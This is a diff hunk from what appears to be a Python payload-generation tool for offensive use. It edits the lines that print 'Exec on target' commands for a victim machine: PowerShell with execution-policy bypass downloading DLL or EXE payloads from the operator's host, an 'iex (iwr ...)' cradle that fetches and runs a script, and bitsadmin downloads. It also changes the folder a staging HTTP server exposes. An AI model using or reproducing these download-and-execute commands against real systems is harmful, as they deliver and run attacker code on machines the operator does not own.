@@ -333,18 +333,18 @@ if __name__ == '__main__':
             if args.format != "vba/wmi" or args.format != "vba/shellcode":
                 if args.dll is True:
                     print(Fore.BLUE + "[+]" + Fore.WHITE +" Exec on target:")
-                    print(" >>> powershell -ep bypass -nop -c '(New-Object System.Net.WebClient).DownloadFile(http://" + args.host + ":" + str(args.port) + "/" + args.name + ".dll, " + args.name + ".dll'")
-                    print(" >>> powershell -ep bypass -nop -c 'Invoke-WebRequest -Uri http://" + args.host + ":" + str(args.port) + "/" + args.name + ".dll -OutFile " + args.name + ".dll'")
+                    print(" >>> powershell -ep bypass -nop -c (New-Object System.Net.WebClient).DownloadFile(http://" + args.host + ":" + str(args.port) + "/" + args.name + ".dll, " + args.name + ".dll")
+                    print(" >>> powershell -ep bypass -nop -c Invoke-WebRequest -Uri http://" + args.host + ":" + str(args.port) + "/" + args.name + ".dll -OutFile " + args.name + ".dll")
                     print(" >>> bitsadmin /transfer pwn /download http://" + args.host + ":" + str(args.port) + "/" + args.name + ".dll " + args.name + ".dll")
                 elif args.format == "Powershell":
-                    print(Fore.GREEN + "[+]" + Fore.WHITE +" >>> Exec on target: powershell -ep bypass -nop -c 'iex (iwr http://" + args.host + ":" + str(args.port) + "/" + output_file +" -UseBasicParsing)'")
+                    print(Fore.GREEN + "[+]" + Fore.WHITE +" >>> Exec on target: powershell -ep bypass -nop -c iex (iwr http://" + args.host + ":" + str(args.port) + "/" + output_file +" -UseBasicParsing)")
                 else:
                     print(Fore.BLUE + "[+]" + Fore.WHITE +" Exec on target:")
                     print(" >>> powershell -ep bypass -nop -c (New-Object System.Net.WebClient).DownloadFile('http://" + args.host + ":" + str(args.port) + "/" + args.name + ".exe', '" + args.name + ".exe')")
                     print(" >>> powershell -ep bypass -nop -c Invoke-WebRequest -Uri http://" + args.host + ":" + str(args.port) + "/" + args.name + ".exe -OutFile " + args.name + ".exe")
                     print(" >>> bitsadmin /transfer pwn /download http://" + args.host + ":" + str(args.port) + "/" + args.name + ".exe " + args.name + ".exe")
                 if args.staging is True:
-                    http_server(args.host, args.port, "output/")
+                    http_server(args.host, args.port, ".")
     except KeyboardInterrupt:
         quit_message  = input("\n" + Fore.BLUE + "[+]" + Fore.WHITE +"Confirm you really want to quit (y/n)\n")
         if quit_message == "y":
